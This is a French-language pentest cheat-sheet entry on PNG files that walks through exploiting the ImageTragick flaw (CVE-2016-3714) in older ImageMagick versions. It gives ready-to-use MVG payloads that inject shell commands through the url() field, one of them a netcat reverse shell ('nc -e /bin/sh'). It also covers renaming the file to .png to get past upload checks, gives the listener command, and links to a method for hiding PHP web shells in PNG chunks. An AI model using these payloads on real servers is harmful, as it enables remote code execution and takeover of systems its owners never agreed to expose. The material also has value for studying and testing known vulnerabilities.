# PNG

**Facteur de risque** : RCE

**Extensions** : `.png`

**Type MIME** : image/png

**Description** : 

Le **Portable Network Graphics** ou **PNG**, est un format ouvert d'images. C'est un fromat sans perte.

## Sommaire

- ImageTragick

## RCE : ImageTragick CVE-2016–3714

<img src="logo_imagetragick.png" title="" alt="" height="200">

**ImageMagick** est un logiciel utilisé pour créer, modifier (redimensionner), convertir ou afficher des fichiers d'images dans un très grand nombre de formats.

ImageMagick possède plusieurs failles, donc une qui permet d'exécuter du code arbitraire à distance : https://imagetragick.com

### Pré-requis

- ImageMagick <= 6.9.3-9 est utilisé par le serveur web

ImageMagick essaie de deviner le type de fichier en fonction de son contenu, l'exploitation ne dépend donc pas de l'extension du fichier. Vous pouvez renommer exploit.mvg en exploit.jpg ou exploit.png pour contourner les contrôles de type de fichier.

### Exploitation

1. Copier le code suivant, qui permet de lister le répertoire :
   
   ```shell
     push graphic-context
   viewbox 0 0 640 480
   fill 'url(https://example.com/image.jpg";|ls "-la)'
   pop graphic-context
   ```
   
    La fonction `url()` est censé contenir l'URL d'une image (`https://example.com/image.jpg`). Ici on injecte le code `";|ls "-la` pour lister le répertoire.

2. Téléverser ce fichier sur l'application.

Comme l'exploitation se passe au moment du téléversement, l'utilisateur peut ne pas voir pas le résultat des commandes. Mais un **reverse shell** est possible !

1. Copier le code suivant :
   
   ```shell
   push graphic-context
   viewbox 0 0 640 480
   fill 'url(https://example.com/image.jpg";|nc -e /bin/sh IP_ADDRESS "PORT)'
   pop graphic-context
   ```
   
   La fonction `url()` est censé contenir l'URL d'une image (`https://example.com/image.jpg`). Ici, on injecte le code `";|nc -e /bin/sh IP_ADDRESS_HERE "PORT_HERE` pour avoir un reverse shell.

2. Remplacer `IP_ADRESS` et `PORT` dans le code (faire attention aux guillemets présents), puis enregistrer sous forme d'image (**rce.png**). Par exemple :
   
   ```shell
   fill 'url(https://example.com/image.jpg";|nc -e /bin/sh 127.0.0.1 "1234)'
   ```

3. Écouter votre port :
   
   ```shell
   nc -lnvp 1234
   ```

4. Téléverser ce fichier sur l'application. 
   Au moment du téléversement, ImageMagick va traiter l'image, et exécuter en le code.

## References

- https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
- ImageTragick : 
  - https://imagetragick.com

## Todo

- Embedding PHP Shell on PNG : https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
